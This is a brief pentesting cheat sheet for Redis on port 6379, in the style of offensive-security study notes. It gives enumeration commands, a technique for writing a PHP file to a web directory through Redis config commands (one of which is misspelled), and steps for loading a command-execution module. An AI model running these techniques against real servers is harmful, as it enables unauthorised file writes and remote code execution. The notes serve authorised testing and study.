## TCP 6379 Redis


### Enumeration
```
nmap --script redis-info -p 6379 <IP>
```

### Redis CLI

```
sudo apt install redis-tools
redis-cli -h <IP>
```

### Redis Commands

```
INFO - Will return whether authentication is required
AUTH <username> <password> - used to authenticate to the service
SELECT <database number> - select a database
KEYS * - Get all the keys
GET <key> - get a specific key
```

### Redis RCE

In some instances, it may be possible to remotely create a file on the system using the redis commands.  This exploit may be used to create files on the remote system 
```
# Creating a web accessible file
redis-cli -h <IP>
config set dir <remote directory>
config send dbfilename <newfile>.php
set test "<?php phpinfo(); ?>"
save

```
### Redis Shell Module

1. Compile the [redis module] (https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)  
2. Upload the module to the remote server
3. Use the following commands to load the module.
```
MODULE LOAD /path/to/module.so
MODULE LIST
```
3. Execute commands

### Additional Redis References
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

